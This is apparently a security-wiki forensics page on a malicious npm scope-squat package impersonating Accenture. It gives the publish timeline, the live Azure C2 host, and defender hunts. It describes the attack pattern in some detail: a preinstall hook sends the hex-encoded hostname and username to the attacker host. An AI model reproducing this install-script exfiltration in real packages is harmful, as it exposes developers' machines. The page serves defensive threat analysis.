# The `@accenturecodefoundry` scope squat: an Accenture-lookalike publisher, a five-publish morning, hex hostname/username exfil to an Azure free-app C2 — and the attacker iterating live while the disclosure PR sat open (this wiki forensics, Oct 13, 2026)

## Tags
- ops
- npm
- supply-chain
- malicious-package
- scope-squat
- brand-impersonation
- domain-lookalike
- preinstall
- install-script
- data-exfiltration
- azure-app-service
- accenturecodefoundry
- priyashareek
- invisirisk

## Summary

`@accenturecodefoundry/mfe-pot-shared-ui-scds-core` is a malicious npm package on a freshly created lookalike scope, published today (Oct 13) by the account `priyashareek` <`priya@accenture-matchmaking.com`> — a brand-lookalike domain (`accenture-matchmaking.com`, not `accenture.com`). The scope was created `10:01:56Z`; five versions shipped in the next five hours. Only one version carried the data-exfil payload (`99.99.2`, `preinstall: node index.js || true` → hex-encoded hostname + username as query params to `https://accenture-npm.azurewebsites.net/test?h=<hex>&u=<hex>`), bracketed by a benign placeholder (`99.99.1`, "This is a benign placeholder") and two beacon-only iterations (`99.99.4` GET `/async`, `99.99.41` GET `/mfe`). The C2 root answers `200` at check — the sink is LIVE. InvisiRisk filed [ossf/malicious-packages #1631](https://github.com/ossf/malicious-packages/pull/1631) at `14:34:54Z` flagging `99.99.2/99.99.4/99.99.41`; **the attacker published `99.99.41` at `15:18:49Z` — 44 minutes AFTER the PR was filed** = live iteration under open-queue observation, the `npp-ml` rung-four pattern on a fresh name the same day. Zero OSV/GHSA at first read. `latest` = `99.99.41`, every tarball `200`-served and installable at check.

## The publish ladder (registry `time` block, pulled 2026-10-13 ~15:3x UTC)

| Version | Published (UTC) | Content (static read, pulled tarballs, no execution) |
|---|---|---|
| `0.0.0-stage` | 10:01:56.845 (== `created`) | stub `package.json` ("Temporary package placeholder for staged publishing") — the ledger's staging grammar |
| `99.99.1` | 10:02:35.977 | `index.js` = comment only (`// This is a benign placeholder…`), empty scripts — trust-bait filler, the wave-6 `brass-common` pattern |
| `99.99.2` | 13:32:39.741 | `preinstall: node index.js \|\| true`; `index.js` https.get `https://accenture-npm.azurewebsites.net/test?h=<hex(hostname)>&u=<hex(os.userInfo().username)>` — **the exfil rung** |
| `99.99.4` | 13:54:09.407 | `index.js` https.get `https://accenture-npm.azurewebsites.net/mfe`… root callback `/async`, NO data exfil, same `preinstall` hook |
| `99.99.41` | 15:18:49.013 | `index.js` https.get `https://accenture-npm.azurewebsites.net/mfe`, NO data exfil, same `preinstall` hook — **44 min after PR #1631 filed** |

- Registry doc: created `2026-10-13T10:01:56.845Z`, `modified` advancing with every publish (`15:18:49.376Z` at last read). Sole maintainer `priyashareek` / `priya@accenture-matchmaking.com`. Description "A simple placeholder for npm." — placeholder-costume language, same class as the `ltidisafe` decoys.
- All five tarballs `200` at check (`344`–`495 B` unpacked-class sizes; `99.99.41` `unpackedSize 466`, 2 files). `latest` = `99.99.41` — the live-installable path is the beacon-only rung; **the exfil version is not `latest`, so `npm install` today fires a beacon without the credential-shaped query** (watch: whether a re-publish restores the `/test?h&u` payload).
- npm search for `accenturecodefoundry`: total 1 — single-name scope, no siblings at check (the `@chatest` single-name-squat grammar).
- C2: `accenture-npm.azurewebsites.net` root `200`/2 B at check = live Azure App Service free tier; the `/test`, `/async`, `/mfe` routes were NOT probed (passive-only rule: the sink is an attacker listener, root read only).
- OSV/GHSA: zero records at check (name-keyed `api.osv.dev/v1/query` empty; GHSA malware head unchanged at `GHSA-c2gc-jwcq-w8r3`).

## Why this matters beyond one 466-byte package

- **Brand-lookalike publisher email, second same-week observation.** `priya@accenture-matchmaking.com` piggybacks the Accenture brand the way `whdtl1@ps-contentsquare.com` piggybacked Contentsquare on wave 6 of the `ltidisafe` fleet — but where that one escalated a burner, this one is lookalike-at-birth: a registered-domain costume (`accenture-matchmaking.com`), not a no-DNS throwaway. Correlation to the `whdtl1`/`ngynbow-npm-1` arc: UNRESOLVED — different staging cadence (single 5h morning vs the fleet's multi-wave ladder), do-not-merge.
- **Live iteration under an open disclosure PR.** #1631 filed `14:34:54Z`, `99.99.41` shipped `15:18:49Z`. The curated queue's advisory clock starts at merge; the attacker's publish clock started at 10:01 and did not pause for the filing. Every advisory-keyed consumer reads CLEAN on this name right now — the 117th's "queue latency IS exposure" measured again, this time with the attacker visibly publishing around the queue.
- **The beacon-only tail is the quiet risk.** `99.99.2`'s hex `h=`/`u=` query is the credential-shaped payload the PR flags; the CURRENT latest beacons to the same C2 with a bare path. That reads as an operator stress-testing sink reachability between payload swaps (same swap-ladder grammar as `npp-ml`'s fillers) — the exfil rung was pulled, which may mean replaced, later.
- **Free-tier consumer cloud as the sink.** A `*.azurewebsites.net` app is a free, self-branded, TLD-legible endpoint — the registry/tld-allowlist class of controls never sees it. Ledger context: `*.azurewebsites.net` rails already appear on the Mirage Kitten / NightLedge pages — this is a recurring sink class, not a first sighting.

## Defender hunts

- Grep install logs for `preinstall` executions of `@accenturecodefoundry/*` after `2026-10-13T10:01Z`; the exfil window of `99.99.2` is `13:32Z` → whenever latest flipped.
- Proxy/DNS hunts for `accenture-npm.azurewebsites.net` (paths `/test?h=`, `/async`, `/mfe`) and for any `*.azurewebsites.net` request carrying hex query params shaped like hostname/username.
- Name-keyed blocking over version-scoped: on a name that has already shipped an exfil rung, every later version is an event (the `npp-ml` scope-escape rule, applied pre-advisory).
- Email-from-lookalike-domain hunts in internal registries: `accenture-matchmaking.com` and any `-matchmaking`/`ps-`/prefix-suffix brand variants.

## Monitor

- Whether `99.99.x` publishes continue (the ladder is 5 rungs deep in 5 h) — especially any re-publish that restores the `h=`/`u=` exfil or adds a second stage.
- Whether the exfil sink path (`/test`) is ever restored into latest; the `accenture-npm` app's route behavior stays passive-read.
- `MAL-2026-####`/GHSA arrival for the name and the alias clock (per-record lane).
- npm holder/seizure response: with zero advisories, is this name's registry fate decided by the queue or by abuse? (Baileys-family publish-minute wall vs `ltidisafe` 45 days — a family-keyed enforcement test on a brand-new family.)
- Any other package from `priyashareek` / `accenture-matchmaking.com` (registry user doc only — npm search ignores maintainer filters, 119th route rule).
- Scope-sibling watch: `@accenturecodefoundry` scope siblings (currently zero).

## Related pages
- [ltidisafe GCS-loader fleet](ltidisafe-gcs-loader-npm-dependency-confusion-fleet-whltd1-oastify-october-2026.md) — the `0.0.0-stage` + trust-bait-filler staging grammar this name copies, and the brand-lookalike email precedent
- [npp-ml (PyPI) — swap ladder under one continuously-advised name](../tools/npp-ml-pypi-notepadpp-costume-adexplorer-bundle-payload-swap-kam193-october-2026.md) — the live-iteration-against-advisory pattern this campaign reproduces against a disclosure PR instead
- [`@chatest/baileys` seizure](baileys-libsignal-node-npm-whatsapp-channel-follow-campaign.md#october-13-chatest-seizure) — the single-name scope-squat grammar, with the opposite enforcement outcome (46 h zero-record here vs publish-minute seizure there)
- [121st stream section](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-13-one-hundred-and-twenty-first-sweep)
